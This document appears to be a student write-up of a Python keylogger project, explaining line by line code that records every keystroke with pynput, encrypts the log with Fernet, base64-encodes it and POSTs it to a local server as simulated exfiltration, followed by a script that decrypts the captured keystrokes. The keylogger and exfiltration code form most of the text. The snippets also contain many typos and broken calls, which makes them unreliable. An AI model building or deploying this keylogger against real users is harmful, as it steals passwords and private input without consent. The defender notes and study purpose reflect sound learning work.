Keylogger Project=>
Here I had uploaded the program for keylogger which are 2 pdf's and uploaded output as a screenshot.
A keylogger is a Program or tool which is used to capture keystrokes.As well as I had used encrypted data Exfilteration.
Exfiltration is a process of transfer of sensitive information from a computer system or network an external destination. 
Exfiltration is actually just same as data theft where attackers aim to extract values data for malicious purposes.
Here following libraries are used for following purposes:-

import os->for file system operation (like checking if the key file exists).

from pynput import Keyboard->Pynput is a library which is used to control and monitor input devices such as keyboard and mouse.From this I included Keyboard for monitoring keyboard.For capturing and Listening to
keytrokes on the system.
From cryptograppy fernet import ferner->This Library provides a secure and easy to use symmetric encryption scheme Here fernet is an encryption algorithom.
import base 64-> for encoding the encrypted data to safely send over the network
import datetime-> For generating timestamp for log entries.
import requests->for sending HTTP POST requests (simulating exfiltration).

Fernet:
The scheme used here is fernet.
Fernet is a symmetric encryption scheme provided by the cryptography library in Python. It is designed to be a secure and user-friendly way to encrypt and decrypt data.
->key File='encryption_key.key':Defines a filename to save or load the encryption key.
->if os.path.exists (key_File):Checks if encryption key file exists.
->with open (Key_File,'rb') as f: If exists, open the key file in binary read mode.
->Key=f.read(): Read the saved fernet key from fik.
->else:If the key file does not exist, generate one.
->Key = Fernet. generate_key()
→ with open (key_File,'wb') as f:creates a new key file for writing the newly generated key.
->f.write (KEY):saves the key to a file for writing the newly generated key.
->fernet = Fernet (KEY):Initializes the zernet encryption/decryption instance with the key.
->Log_File = "keys.txt":Sets the filename where encrypted keystore will be stored.
->KILL_SWITCH=keyboard Key.esc:Sets the ESC key as the kill switch which when pressed will stop logging.

Note:Malware often has kill switches for testing. Analysts can search for these as potential weak points to terminate execution.

Writing Encrypted Logs
Prepare a log entry with timestamp + keystrokes Encrypts it with Fernet.
Writes encrypted data to file
Base64 encodes it and exfilterates by POSTING to a server
Note:I was confused here Log-data is not a pre-defined paramater.It is actually taken that while Calling function we pass the real arguments.
Code->
def
Write_encrypted_logo(log-data):
      timestamp=datetime.datetime.utconow().isofformat()
      log = f"{timestamp}:{log_data}\n"
      enc_log = ferrnet.encrypt (log.encode) 
      with open (LOG_FILE, "ab") as f:
           f.write (enc_log +b'\n')
#simulate exfiltration
b64_ence_log = base64.64 encode(enc_log).decode()
requests.port('http://127.0.0.1:5000/recieve'),
data = {'data': b64_enc_log}
Note:
Defenders should monitor Post traffu to unknown servers and scan for encrypted data leaving endpoints.

Keylogger Listener
def on_press(key):
     try:
        write_encrypted_log(str(key.char))
     except AttributeError:
        write_encrypted_log (str(key))
      if key==KILL_SWITCH:
           #end listener
           return False
Listener=keyboard. Listener(on_press=on_press)
listener.start()
listener.join()
def on_press(key):Defines the callback function that is triggered every time a key is pressed.The key parameter represent the key that was pressed.
try: Starts a try expect block to handle different types of key presses.
→Write- encrypted-log (str key char)):Tries to get the character representation of the key(e.g..'a',b','1') and passes it the write_encrypted_log function.This works for most alphanumeric keys.
→ except Attribute Error: This Block is executed if key.char fails, which happen sfor special keys like shift, ctrl or space.
->write_encrypted_log(str(key.char)):tries to get the character representation of the key(e.g..,'a','b,'1')and passes it the write_encrypted_log function.This works for most alphanumeric keys.
→ if key == KILL-switch: checks if the pressed key is the delignated kill switch (sscape)
→ return False: If the kill switch is pressed this line returns false, which signals the pynput listener to stop.
→listener = keyboard.Listener(on_press=on_press) creates an instance of the keyboard.listener class. It configured to call the on_press function wheneler a key is pressed.
->listener.start() :- starts the listener in a seperate thread, allowing to continue the main program running.
→ listener.join():starts for the listener thread to finish. This keeps the program running and listening for key presses untill the return False statement is triggered by the kill switch.

This was the code for encrypting and capturing key strokes storing in a file.
Now I will write the code for reading,decrypting and printing the keystrokes that had been captured,encrypted and stored in a file.
Here the encryption used for encrypting and decrypting is symmetric Encryption which uses a single for this operation.
Algorithim:-
Fernet Key -The scripts leads a symmetric encryption key from a file named encryption_key.key and uses it to instantiate the Fernet object.
Reading Encrypted Data - It reads all lines in Keys.txt, each presumed to be individual encrypted log line.
Decryption Process: Each line is stripped of whitespace (to remove newline character) and then decrypted using Fernet.If decryption succeeds, the original plaintext log is printed with time stamped; otherwise an error message occurs.
From cryptography.fernet import Fernet → This line imports the fernet class from the cryptography.fernet module.Fernet is a symmetric encryption scheme that provides a high level API for encrypting and decrypting data.symmetric means the same key is used for both encryption and decryption.
Note:
Here we have encoded and decoded the text before encrypting because fernet encryption algorithim operate on raw bytes, not on text strings. The byte string was then passed to the fernet. decrypt() and encrypt method. It was encoded and decoded into Bytes before encrypting by UTF-8 method.

Code & explaination:

->from cryptography.Fernet import Fernet=>This line imports class from the cryptography library for symmetric encryption and decryption.
->with open('encryption_key.key','rb') as f:key=f.read()=>This block opens the encryption_key.key file in read binary(rb) mode and reads the encryption key.
->fernet=Fernet(key)=>This line creates a Fernet object using the loaded key.
->with open ('keys.txt','rb') as f: encrypted lines=f.readlines(): This block opens keys.txt file in read-binary(rb) mode.
->for enc_line=enc_line.strip()=>The strip() method is used to remove any leading or traiing whitespaces, including the newline character (\n) that are often at the end of lines when reading as a byte.
=>decrypted_log=decrypted_bytes.decode()=>Since the output of decrypt() is a byte string, you need to convert it to a human-readable string.
=>print(decrypted_log)=>For printing decrypted log data.
=>except Exception as e:printf("Failed to decrypt a line:{e}")
